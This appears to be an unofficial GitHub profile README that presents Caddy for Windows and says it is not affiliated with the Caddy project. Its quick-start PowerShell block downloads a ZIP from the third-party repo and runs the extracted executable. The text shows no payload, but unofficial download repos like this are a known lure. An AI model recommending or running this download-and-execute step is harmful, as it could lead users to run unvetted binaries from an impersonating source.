# CaddySoftware

## Caddy for Windows — Web Server, Reverse Proxy, and Automatic HTTPS

Independent Caddy software reference focused on Windows web servers, reverse proxy
configuration, local development, and automatic HTTPS workflows.

This profile provides a simple GitHub-based starting point for administrators,
developers, and self-hosted infrastructure teams looking for a modern web server
that can serve websites, route traffic to backend applications, and manage HTTPS
for configured domains.

### What is Caddy?

Caddy is a modern, production-ready web server and reverse proxy. Its
configuration is designed to be readable and practical for websites, APIs,
development environments, and self-hosted services. Caddy can serve static files,
proxy requests to local applications, and automate certificate management for
authorized domains.

### Featured capabilities

- Windows amd64 package for quick local setup
- Web server for static websites and applications
- Reverse proxy for local services and APIs
- Automatic HTTPS for configured domains
- Simple `Caddyfile`-based configuration
- GitHub Release delivery with a direct ZIP download

## Projects

- [Caddy Windows download](https://github.com/CaddySoftware/caddy-download) —
  package information, Quick start, and GitHub Release asset
- [Caddy landing page](https://CaddySoftware.github.io/) —
  project overview, features, and setup instructions

## Quick start

Download the Windows package from the
[latest GitHub Release](https://github.com/CaddySoftware/caddy-download/releases/latest),
extract it, and verify the executable:

```powershell
$zip = ".\caddy-2.11.7-windows-amd64-original.zip"
Invoke-WebRequest "https://github.com/CaddySoftware/caddy-download/releases/latest/download/caddy-2.11.7-windows-amd64-original.zip" -OutFile $zip
Expand-Archive $zip .\caddy
.\caddy\caddy.exe version
```

Use Caddy only with domains, systems, and services that you own or are
authorized to administer.

> Caddy and related product names belong to their respective owners. This
> independent profile is not affiliated with or endorsed by the Caddy project.
